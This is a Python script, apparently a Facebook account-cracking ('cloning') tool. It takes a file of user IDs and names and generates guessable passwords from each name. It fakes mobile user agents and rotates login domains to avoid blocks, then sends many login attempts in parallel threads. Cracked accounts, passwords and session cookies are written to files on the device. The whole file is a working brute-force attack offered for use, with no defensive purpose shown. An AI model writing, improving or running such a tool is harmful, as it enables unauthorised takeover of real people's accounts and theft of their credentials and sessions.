#!/usr/bin/python3
#-*-coding:utf-8-*-
# AUTHOR: CHARSI BRAND HU (V22 GLOBAL)
# FEATURES: WORLDWIDE USERAGENTS + HYBRID CLONING

import os, requests, re, sys, time, random
from concurrent.futures import ThreadPoolExecutor as CharsiTurbo

# --- COLORS ---
G = '\x1b[1;92m' # Green
W = '\x1b[1;97m' # White
R = '\x1b[1;91m' # Red
C = '\x1b[1;36m' # Cyan
Y = '\x1b[1;93m' # Yellow

loop, ok, cp = 0, [], []
id = []

def logo():
    os.system('clear')
    print(f"""{G}
   ____ _   _    _    ____  ____ ___ 
  / ___| | | |  / \  |  _ \/ ___|_ _|
 | |   | |_| | / _ \ | |_) \___ \ | | 
 | |___|  _  |/ ___ \|  _ < ___) || | 
  \____|_| |_/_/   \_\_| \_\____/___|
{W} ----------------------------------------------
{G} [•] AUTHOR    : CHARSI BRAND HU
{G} [•] MODELS    : ALL WORLD (iPHONE/S24/PIXEL)
{G} [•] METHOD    : GLOBAL FILE CLONING
{W} ----------------------------------------------""")

def global_ua():
    """World-Wide Heavy User-Agents Engine 2025"""
    fb_v = f"{random.randint(440, 480)}.0.0.0"
    fb_bv = str(random.randint(500000000, 999999999))
    
    # List of high-end global devices
    models = [
        f"SM-S928B; Build/UP1A.231005.007", # Samsung S24 Ultra
        f"iPhone16,2; CPU iPhone OS 17_5 like Mac OS X", # iPhone 16 Pro Max
        f"Pixel 8 Pro; Build/UD1A.230805.018", # Google Pixel
        f"OnePlus 12; Build/UKQ1.230924.001", # OnePlus 12
        f"Xiaomi 14 Ultra; Build/UKQ1.230804.001", # Xiaomi
        f"Sony XQ-DQ72; Build/67.0.A.4.104" # Sony Xperia
    ]
    device = random.choice(models)
    
    # Crafting the perfect header for 2025
    if "iPhone" in device:
        return f"Mozilla/5.0 ({device}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 [FBAN/FBIOS;FBAV/{fb_v};FBBV/{fb_bv};FBDV/{device.split(';')[0]};FBMD/iPhone;FBSN/iOS;FBSV/17.5;FBSS/3;FBID/it;FBLC/en_US;FBOP/5;FBCR/Carrier]"
    else:
        return f"Mozilla/5.0 (Linux; Android {random.randint(12,15)}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,132)}.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/{fb_v};FBBV/{fb_bv};]"

def main():
    logo()
    print(f" {G}[1] FILE CLONING (GLOBAL METHOD)")
    print(f" {G}[2] RANDOM CLONING (ALL WORLD)")
    print(f" {R}[0] EXIT")
    opt = input(f"\n {C}[?] Choice : {W}")
    if opt == '1':
        file_crack()
    else:
        sys.exit()

def file_crack():
    logo()
    path = input(f" {G}[?] File Path : {W}")
    try:
        global id
        id = open(path, 'r').read().splitlines()
    except:
        print(f" {R}[!] File Not Found!"); time.sleep(2); main()
    
    logo()
    print(f" {G}[*] Total IDs : {len(id)}")
    print(f" {G}[*] Speed     : 45 (Global Turbo)")
    print(f"{W} ----------------------------------------------")
    
    with CharsiTurbo(max_workers=45) as turbo:
        for user in id:
            try:
                uid, name = user.split('|')[0], user.split('|')[1]
                pwx = generate_passwords(name)
                turbo.submit(crack_engine, uid, pwx)
            except: pass

    print(f"\n{W} ----------------------------------------------")
    print(f" {G}[√] Cloning Complete. OK: {len(ok)}")
    input(" Press Enter To Main Menu ")
    main()

def generate_passwords(name):
    nm = name.lower()
    first = nm.split(' ')[0]
    # Global Password Patterns 2025
    pwx = [nm, name, first+'123', first+'1234', first+'786', first+'khan', first+'12', first+'@123', '57273200', '786786', 'pakistan', 'khan123']
    return list(set(pwx))

def crack_engine(uid, pwx):
    global loop, ok, cp
    sys.stdout.write(f'\r {W}[CHARSI-V22] {loop}/{len(id)} {G}OK:{len(ok)} {Y}CP:{len(cp)} ')
    sys.stdout.flush()
    
    for pw in pwx:
        try:
            # Domain switching for global bypass
            domain = random.choice(['m.facebook.com', 'p.facebook.com', 'x.facebook.com', 'mbasic.facebook.com'])
            session = requests.Session()
            ua = global_ua()
            
            header = {
                'authority': domain,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9,en-PK;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://'+domain,
                'referer': 'https://'+domain+'/login.php',
                'user-agent': ua,
            }
            
            res = session.get(f'https://{domain}/login.php').text
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(res)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(res)).group(1),
                "email": uid,
                "pass": pw,
                "login": "Log In"
            }
            
            post = session.post(f'https://{domain}/login/device-based/regular/login/', data=data, headers=header, allow_redirects=False)
            
            if 'c_user' in session.cookies.get_dict():
                coki = ";".join([k+"="+v for k,v in session.cookies.get_dict().items()])
                print(f'\r\r{G} [CHARSI-OK] {uid} | {pw} \n [COOKIE] {coki} ')
                ok.append(uid)
                open('/sdcard/CHARSI_OK.txt', 'a').write(f'{uid}|{pw}|{coki}\n')
                break
            elif 'checkpoint' in session.cookies.get_dict():
                # print(f'\r\r{Y} [CHARSI-CP] {uid} | {pw} ')
                cp.append(uid)
                open('/sdcard/CHARSI_CP.txt', 'a').write(f'{uid}|{pw}\n')
                break
        except: pass
    loop += 1

if __name__ == "__main__":
    main()
